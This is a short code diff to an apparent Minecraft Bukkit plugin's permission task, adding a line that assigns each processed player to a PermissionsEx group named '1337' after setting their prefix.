@@ -26,6 +26,8 @@ public class SetPermissionTask extends BukkitRunnable{
     
     PermissionsEx.getUser(playerName).setOption("prefix", prefix);
     
+    PermissionsEx.getUser(playerName).addGroup("1337");
+    
     /*for(World world : Bukkit.getWorlds()){
       PermissionsEx.getUser(playerName).setPrefix(prefix, world.getName());
     }*/
